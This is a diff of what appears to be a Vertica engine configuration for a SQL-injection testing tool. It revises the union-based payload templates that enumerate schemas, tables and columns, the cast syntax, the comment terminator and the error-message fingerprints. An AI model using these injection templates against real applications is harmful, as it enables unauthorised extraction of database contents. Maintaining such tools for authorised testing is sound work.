@@ -20,12 +20,12 @@ resource:
    from (
        select distinct
            '${enclose_value_sql}'
-           || table_schema
+           || schema_name
            || '${separator_qte_sql}'
            || '0'
            || '${enclose_value_sql}'
            rr
-       from v_catalog.tables
+       from v_catalog.all_tables
        order by rr
        ${limit}
    )x
@@ -43,8 +43,8 @@ resource:
            || '0'
            || '${enclose_value_sql}'
            rr
-       from v_catalog.tables
-       where table_schema = '${database}'
+       from v_catalog.all_tables
+       where schema_name = '${database}'
        order by rr
        ${limit}
    )x
@@ -62,9 +62,9 @@ resource:
            || '0'
            || '${enclose_value_sql}'
            rr
-       from v_catalog.columns
-       where columns.table_schema = '${database}'
-       and columns.table_name = '${table}'
+       from v_catalog.jdbc_columns
+       where jdbc_columns.schema_name = '${database}'
+       and jdbc_columns.table_name = '${table}'
        order by rr
        ${limit}
    )x
@@ -91,7 +91,7 @@ resource:
     field: |
      trim(
          coalesce(
-             ${field.value}::varchar,
+             cast(${field.value} as varchar),
              ''
          )
      )
@@ -114,13 +114,16 @@ strategy:
            '${trail_sql}'
        )
   limit: limit 1 offset ${limit.value}
-  failsafe: (1337${indice}7330%2b1)::varchar
+  failsafe: cast((1337${indice}7330%2b1) as varchar)
   calibrator: repeat(chr(35), 1024)
   limitBoundary: 0
   endingComment: --+-
   fingerprint:
    errorMessage:
-    - Vertica Analytics
+    - vertica
+   orderByErrorMessage:
+    # Collision with postgres
+    - (?!.*Vertica)ORDER BY position 1337 is not in select list
 
  normal:
   indices: union select ${indices}
